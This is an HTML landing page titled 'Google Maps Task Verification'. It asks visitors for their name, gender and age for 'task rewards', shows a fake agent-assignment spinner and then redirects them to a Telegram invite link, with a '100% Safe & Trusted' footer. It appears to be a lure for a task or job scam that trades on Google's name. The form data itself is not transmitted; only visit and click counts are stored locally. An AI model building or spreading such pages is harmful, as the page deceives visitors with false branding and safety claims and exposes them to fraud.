<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Maps Task Verification</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #f8fafc;
            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            box-sizing: border-box;
        }
        .safe-container {
            max-width: 420px;
            width: 90%;
            background: #ffffff;
            padding: 30px 24px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.06);
            border: 1px solid #e2e8f0;
            text-align: center;
            box-sizing: border-box;
        }
        .badge {
            display: inline-block;
            background: #eff6ff;
            color: #2563eb;
            font-size: 11px;
            font-weight: 700;
            padding: 5px 12px;
            border-radius: 20px;
            margin-bottom: 12px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .safe-container h1 {
            font-size: 20px;
            color: #0f172a;
            margin-bottom: 8px;
            font-weight: 700;
        }
        .safe-container p {
            font-size: 13px;
            color: #64748b;
            margin-bottom: 20px;
            line-height: 1.5;
        }
        .form-group {
            margin-bottom: 15px;
            text-align: left;
        }
        .form-group label {
            display: block;
            font-size: 12px;
            font-weight: 600;
            color: #475569;
            margin-bottom: 5px;
        }
        .form-control {
            width: 100%;
            padding: 12px 14px;
            border: 1px solid #cbd5e1;
            border-radius: 10px;
            font-size: 14px;
            box-sizing: border-box;
            outline: none;
            background: #fff;
            transition: border-color 0.2s;
        }
        .form-control:focus {
            border-color: #2563eb;
        }
        .safe-btn {
            display: block;
            width: 100%;
            background: #2563eb;
            color: white;
            border: none;
            padding: 15px;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            text-decoration: none;
            box-sizing: border-box;
            text-align: center;
            margin-top: 10px;
            box-shadow: 0 0 15px rgba(37, 99, 235, 0.4);
            animation: glowing-btn 2s infinite;
        }
        @keyframes glowing-btn {
            0% { box-shadow: 0 0 5px rgba(37, 99, 235, 0.4); }
            50% { box-shadow: 0 0 20px rgba(37, 99, 235, 0.8), 0 0 30px rgba(37, 99, 235, 0.4); }
            100% { box-shadow: 0 0 5px rgba(37, 99, 235, 0.4); }
        }
        #loader-screen {
            display: none;
            padding: 40px 20px;
        }
        .spinner {
            width: 45px;
            height: 45px;
            border: 4px solid #e2e8f0;
            border-top: 4px solid #2563eb;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #loader-text {
            font-size: 15px;
            font-weight: 600;
            color: #1e293b;
        }
        .safe-footer {
            margin-top: 25px;
            font-size: 11px;
            color: #94a3b8;
            border-top: 1px solid #f1f5f9;
            padding-top: 12px;
        }
    </style>
</head>
<body>

  <div class="safe-container">
    
    <!-- Step 1: Form View -->
    <div id="form-screen">
      <div class="badge">Google Maps Task Verification</div>
      <h1>Participant Details</h1>
      <p>Please enter your details below to verify eligibility for task rewards.</p>
      
      <form id="userTaskForm" onsubmit="processUser(event)">
        <!-- Box 1: Name -->
        <div class="form-group">
          <label for="u-name">Your Full Name</label>
          <input type="text" id="u-name" class="form-control" placeholder="Enter your name" required="required" />
        </div>

        <!-- Box 2: Gender -->
        <div class="form-group">
          <label for="u-gender">Select Gender</label>
          <select id="u-gender" class="form-control" required="required">
            <option value="" disabled="disabled" selected="selected">Choose gender</option>
            <option value="Male">Male</option>
            <option value="Female">Female</option>
            <option value="Other">Other</option>
          </select>
        </div>

        <!-- Box 3: Age -->
        <div class="form-group">
          <label for="u-age">Your Age</label>
          <input type="number" id="u-age" class="form-control" placeholder="Enter your age" min="18" max="80" required="required" />
        </div>

        <!-- Glowing Button -->
        <button type="submit" class="safe-btn">Send Message to Receptionist</button>
      </form>
    </div>

    <!-- Step 2: Loader View -->
    <div id="loader-screen">
      <div class="spinner"></div>
      <div id="loader-text">Assigning our Agent to Process...</div>
      <p style="margin-top: 10px; font-size: 12px; color: #64748b;">Please wait while we connect you to the live desk.</p>
    </div>

    <div class="safe-footer">
        Secure Verification Gateway &bull; 100% Safe & Trusted
    </div>
  </div>

  <script>
    function processUser(e) {
      e.preventDefault();
      
      // Form hide karein aur loader screen show karein
      document.getElementById('form-screen').style.display = 'none';
      document.getElementById('loader-screen').style.display = 'block';

      // Tracking stats code (Agar aapka stats.html page hai toh ye count save karega)
      var visits = parseInt(localStorage.getItem('total_visits') || '0') + 1;
      localStorage.setItem('total_visits', visits);
      
      var clicks = JSON.parse(localStorage.getItem('click_logs') || '[]');
      var now = new Date();
      var timeString = now.toLocaleDateString() + ' ' + now.toLocaleTimeString();
      clicks.push(timeString);
      localStorage.setItem('click_logs', JSON.stringify(clicks));

      // Telegram Link Redirect (3.5 seconds baad)
      var tgId = "mRByr5WGPzxjY2U9"; 
      var finalLink = "https://t.me/+" + tgId;

      setTimeout(function() {
          window.location.href = finalLink;
      }, 3500);
    }
  </script>
</body>
</html>
